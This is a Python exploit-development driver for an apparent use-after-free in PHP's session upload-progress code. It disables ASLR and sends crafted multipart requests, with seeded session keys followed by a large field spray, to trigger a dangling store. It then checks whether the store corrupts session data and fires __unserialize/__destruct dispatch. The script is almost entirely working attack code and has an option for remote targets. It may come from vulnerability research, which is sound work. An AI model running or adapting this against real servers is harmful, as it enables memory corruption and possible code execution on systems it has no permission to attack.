#!/usr/bin/env python3
"""rung_driver — sinkless proof rungs 1-2.

Question: when the staleness freeze fires (core-level condition, proven),
does the dangling store land INSIDE application-visible session data, and
does zend_call_function dispatch (__unserialize/__destruct) fire through
the corrupted decode? No shell, no sink: pure request/response against
probe_app.php under setarch -R single-worker php -S.

R1  POST seed[] (probeN|planted ints) + pobj + PROG part + 4KB file
R2  POST spray  (PROG part + 200KB file + FN x FLEN x[] fields)  <- fires freeze
R3  GET         decode + report

PASS rung1: freeze holds (BYTES<CLEN) AND some probeN value arrived as a
small stale counter instead of its planted 999000+N (store landed on app data).
PASS rung2: PFIRE/DESTR lines observed (dispatch legs fire on stock builds).

Seed-count sweep: NSPROBES 1..5 (nTableSize-8 shape, 5 keys + pobj + entry
<= 6 grow threshold). Each config gets its own SID; same request sequence
under setarch -R = allocator replay, so a miss is deterministic layout, not luck.
"""
import os, re, shutil, signal, socket, subprocess, sys, time

ROOT = os.path.expanduser('~/.local/share/php-session-uaf/poc')
PORT = int(os.environ.get('RUNG_PORT', '18883'))
FN   = int(os.environ.get('FN', '150'))
FLEN = int(os.environ.get('FLEN', '2048'))
PROG = 'PHP_SESSION_UPLOAD_PROGRESS'
BOUND = '----rung'
SESS = os.path.join(ROOT, 'rung', 'sessions')
HOST = os.environ.get('RUNG_HOST', '127.0.0.1')     # remote venue support
PATHP = os.environ.get('PATHP', '')                  # e.g. '/probe_app.php' on Apache docroots

def field(name, val):
    return (b'--' + BOUND.encode() + b'\r\nContent-Disposition: form-data; name="'
            + name.encode() + b'"\r\n\r\n' + (val.encode() if isinstance(val, str) else val) + b'\r\n')

def filepart(name, fname, data):
    return (b'--' + BOUND.encode() + b'\r\nContent-Disposition: form-data; name="'
            + name.encode() + b'"; filename="' + fname.encode() + b'"\r\n'
            b'Content-Type: application/octet-stream\r\n\r\n' + data + b'\r\n')

def http(path, body=None, timeout=20.0):
    if PATHP:
        path = PATHP + path
    elif path.startswith('?'):
        path = '/' + path        # php -S rejects origin-form without leading '/'
    m = re.search(r'PHPSESSID=(\w+)', path)
    cookie = ('Cookie: PHPSESSID=%s\r\n' % m.group(1)) if m else ''   # cover use_only_cookies=1 venues
    s = socket.create_connection((HOST, PORT), timeout=timeout)
    try:
        if body is not None:
            hdr = ('POST %s HTTP/1.1\r\nHost: x\r\n' % path + cookie +
                   'Content-Type: multipart/form-data; boundary=%s\r\n'
                   'Content-Length: %d\r\nConnection: close\r\n\r\n'
                   % (BOUND, len(body)))
            s.sendall(hdr.encode() + body)
        else:
            s.sendall(('GET %s HTTP/1.1\r\nHost: x\r\n' % path + cookie + 'Connection: close\r\n\r\n').encode())
        s.settimeout(timeout)
        data = b''
        try:
            while True:
                c = s.recv(8192)
                if not c:
                    break
                data += c
        except socket.timeout:
            pass
        return data.decode('utf-8', 'replace')
    finally:
        s.close()

def start_server():
    shutil.rmtree(SESS, ignore_errors=True)
    os.makedirs(SESS, exist_ok=True)
    log = open(os.path.join(ROOT, 'rung', 'server.log'), 'w')
    p = subprocess.Popen(
        ['setarch', '-R', 'php',
         '-d', 'error_reporting=E_ALL', '-d', 'display_errors=1',
         '-d', 'session.upload_progress.enabled=1', '-d', 'session.upload_progress.cleanup=0',
         '-d', 'session.upload_progress.min_freq=0', '-d', 'session.upload_progress.freq=65536',
         '-d', 'session.use_only_cookies=0', '-d', 'session.use_strict_mode=0',
         '-d', 'session.save_path=' + SESS, '-d', 'memory_limit=256M', '-d', 'post_max_size=64M',
         '-S', '127.0.0.1:%d' % PORT, 'rung/probe_app.php'],
        cwd=ROOT, stdout=log, stderr=subprocess.STDOUT)
    for _ in range(80):
        try:
            socket.create_connection(('127.0.0.1', PORT), 0.3).close()
            return p
        except OSError:
            time.sleep(0.1)
    p.kill(); raise SystemExit('server did not bind :%d — see rung/server.log' % PORT)

def run_once(sid, nseed):
    q = '?PHPSESSID=%s' % sid   # 8.3: cookie invisible at request-start parse
    seeds = [field('seed[]', 'probe%d|%d' % (i, 999000 + i)) for i in range(nseed)]
    body1 = (field(PROG, 'rung') + b''.join(seeds)
             + filepart('file', 'p.bin', b'A' * 4096) + b'--' + BOUND.encode() + b'--\r\n')
    r1 = http(q, body1)
    body2 = (field(PROG, 'rung') + filepart('file', 'big.bin', b'A' * 200000)
             + b''.join(field('x[]', b'z' * FLEN) for _ in range(FN))
             + b'--' + BOUND.encode() + b'--\r\n')
    r2 = http(q, body2)
    r3 = http(q)
    m = re.search(r'ENTRY BYTES=(\d+) CLEN=(\d+)', r3)
    frozen = (int(m.group(1)), int(m.group(2))) if m else (-1, -1)
    km = re.search(r'KEYS (.*)$', r3, re.M)
    pairs = dict((k, int(v)) for k, v in re.findall(r'(\w+)=(\d+)', km.group(1))) if km else {}
    planted = {('probe%d' % i): 999000 + i for i in range(nseed)}
    hits = {k: v for k, v in pairs.items()
            if k in planted and v != planted[k]}
    fired = bool(re.search(r'PFIRE UNSER v=(-?\d+)', r3))
    pfire_v = int(re.search(r'PFIRE UNSER v=(-?\d+)', r3).group(1)) if fired else None
    destr = 'DESTR FIRE' in r3
    return dict(r1_ok='OK' in r1, r2_ok='OK' in r2, frozen=frozen,
                keys=pairs, hits=hits, fired=fired, pfire_v=pfire_v, destr=destr,
                r3=r3)

def main():
    ext = bool(os.environ.get('RUNG_HOST'))
    srv = None if ext else start_server()
    try:
        ts = int(time.time() * 1000) % 1000000
        results = []
        for nseed in range(1, 6):
            sid = 'rung%06d' % ((ts + nseed) % 1000000)   # [0-9a-v] safe charset
            r = run_once(sid, nseed)
            b, cl = r['frozen']
            tag = ('[seed=%d] freeze=%s(%d/%d) hits=%s pobj_fire=%s v=%s destr=%s'
                   % (nseed, 1 <= b < cl, b, cl,
                      (','.join('%s->%d' % (k, v) for k, v in sorted(r['hits'].items())) or 'none'),
                      r['fired'], r['pfire_v'], r['destr']))
            print(tag, flush=True)
            if not r['hits']:
                print('    keys: %s' % ' '.join('%s=%d' % (k, v) for k, v in sorted(r['keys'].items())), flush=True)
            results.append(r)
        froze = sum(1 for r in results if 1 <= r['frozen'][0] < r['frozen'][1])
        hits = sum(1 for r in results if r['hits'])
        disp = sum(1 for r in results if r['fired'] and r['destr'])
        print('VERDICT: freeze %d/5 configs; store-hits %d/5; dispatch(both legs) %d/5'
              % (froze, hits, disp))
        print('rung1 PASS:', hits > 0, '| rung2 PASS:', disp > 0)
        sys.exit(0 if disp > 0 else 1)
    finally:
        if srv:
            srv.send_signal(signal.SIGTERM)
            srv.wait()

if __name__ == '__main__':
    main()
